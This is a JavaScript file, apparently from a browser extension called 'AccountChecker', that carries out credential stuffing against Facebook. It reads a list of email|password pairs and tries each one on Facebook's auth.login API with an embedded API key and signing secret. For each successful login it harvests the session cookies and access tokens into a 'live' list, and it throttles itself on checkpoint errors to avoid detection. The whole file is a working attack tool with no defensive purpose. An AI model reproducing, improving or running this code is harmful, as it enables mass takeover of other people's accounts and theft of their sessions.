if(window.location.search.indexOf('AccountChecker=V1.0') >= 0){
	$('html').html('').ready(function(){
		$.get(chrome.extension.getURL('res/index.html'), function(html){
			$('html').html(html).ready(function(){
				$('form').submit(function(){
					log('<b>Start Check</b> ' + (new Date()), '#389EB5');
					var acc = $.trim($('#accs').val()).split('\n'), checkpoint = 0;
					Check(acc, function(i, error){
						if(error == 405){
							++checkpoint;
						}
						if(checkpoint >= parseInt($('#after').val())){
							log('Limited checkpoint !!');
							$('form button').val(i);
							window.stop();
						}
					}, parseInt($('form button').val()));
				});
				
				function Check(accs, call, i){
					var i = i || 0;
					if(i >= accs.length){
						alert('DONE');
						return false;
					}
					var
						acc = accs[i].split('|'),
						request = {
							"api_key": "882a8490361da98702bf97a021ddc14d",
							"credentials_type": "password",
							"email": acc[0],
							"format": "JSON",
							"generate_machine_id": "1",
							"generate_session_cookies": "1",
							"locale": "en_US",
							"method": "auth.login",
							"password": acc[1],
							"return_ssl_resources": "0",
							"v": "1.0"
						}, 
						sig = '';
						//request.sig = sig;
					$.each(request, function(key, value){
						sig += key+'='+value;
					});
					request.sig = $.md5(sig + '62f8ce9f74b12f84c123cc23437a4a32');
					//console.log(sig);
					if($('#live').val().indexOf(acc[0]) == -1)
						$.getJSON('https://api.facebook.com/restserver.php', request, function(response){
							if(response.error_code == undefined){
								log('<b>'+acc[0]+'</b>: Login Success', '#389EB5');
								cookie = '', c_user = '', xs = '';
								$.each(response.session_cookies, function(k, v){
									if(v.name == 'c_user'){
										c_user = v.value;
									}else if(v.name == 'xs'){
										xs = v.value;
									}
								});
								cookie = (c_user + '|' + xs).encodeBase64();
								$('#counter').text($.trim($('live').val()).split('\n').length);
								
									$('#live').prepend(acc[0]+'|'+acc[1]+'|'+cookie+'|'+response.access_token+'\n');
								
								//$('#counter').text($.trim($('live').val()).split('\n').length);
							}else{
								if(response.error_code != 405)
									log('<b>'+acc[0]+'</b>: '+response.error_msg);
								else
									log('<b>'+acc[0]+'</b>: CHECKPOINT !');
							}
							Check(accs, call, ++i);
							if(call) call(i, response.error_code);
							
						}).fail(function(){
							Check(accs, call, i);
						});
					else
						log(acc[0]+': Duplicated !');
				}
				function log(msg, color){
					var color = color || '#f00';
					$('#log').prepend('<p style="color: '+color+'">'+msg+'</p>');
				}
			});
			
		});

	});
}
